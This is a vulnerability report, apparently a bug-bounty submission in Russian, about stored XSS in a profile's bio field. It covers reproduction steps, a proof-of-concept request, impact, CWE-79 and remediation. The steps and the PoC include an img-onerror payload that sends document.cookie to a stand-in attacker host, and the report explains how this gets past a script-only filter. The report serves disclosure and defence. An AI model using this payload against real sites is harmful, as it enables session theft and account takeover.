## Summary
Поле bio в профиле пользователя сохраняется без санитизации и рендерится как HTML на странице просмотра профиля, что позволяет внедрить JavaScript, выполняемый в контексте любого посетителя профиля.

## Technical Details
**Vulnerable Endpoint:** `PUT /api/v2/user/profile`
**Input Vector:** JSON body, поле bio
**Missing Control:** Отсутствует output-encoding при рендере bio; CSP без unsafe-inline не ограничивает inline-скрипты
**Why Exploitable:** Payload обходит фильтр через <img src=x onerror=...>, т.к. фильтр блокирует только <script>

## Steps to Reproduce

1. Зарегистрировать аккаунт A, зайти в настройки профиля
2. В поле bio вставить: <img src=x onerror="fetch('//evil.tld/?c='+document.cookie)">
3. Сохранить профиль (PUT /api/v2/user/profile)
4. Аккаунтом B (или админом) открыть страницу профиля A
5. Наблюдать: выполняется JS, cookie отправляется на evil.tld

## Proof of Concept

```
PUT /api/v2/user/profile HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=A...

{"bio": "<img src=x onerror=\"fetch('//evil.tld/?c='+document.cookie)\">"}
```

## Impact
- **Attacker capability:** Кража сессии любого пользователя (включая админа), просмотревшего профиль; действия от его имени
- **Data exposure:** Session cookie, CSRF-токены, содержимое страницы в контексте жертвы
- **Privilege escalation:** Полный захват аккаунта (ATO) через кражу сессии
- **Business risk:** Компрометация аккаунтов клиентов и администраторов, утечка персональных данных
- **Why not self-XSS / low impact:** XSS срабатывает у любого посетителя профиля без самостоятельных действий жертвы, кроме перехода на страницу

## CWE Classification
**CWE-79: Improper Neutralization of Input During Web Page Generation**
Пользовательский ввод вставляется в генерируемую страницу без нейтрализации — прямое соответствие CWE-79.

## Remediation
Использовать textContent вместо innerHTML при рендере bio; добавить CSP с nonce и запретом inline-скриптов; на входе — серверную санитизацию (DOMPurify) с allowlist.

---
*VRT Priority: P2 | 2026-10-29*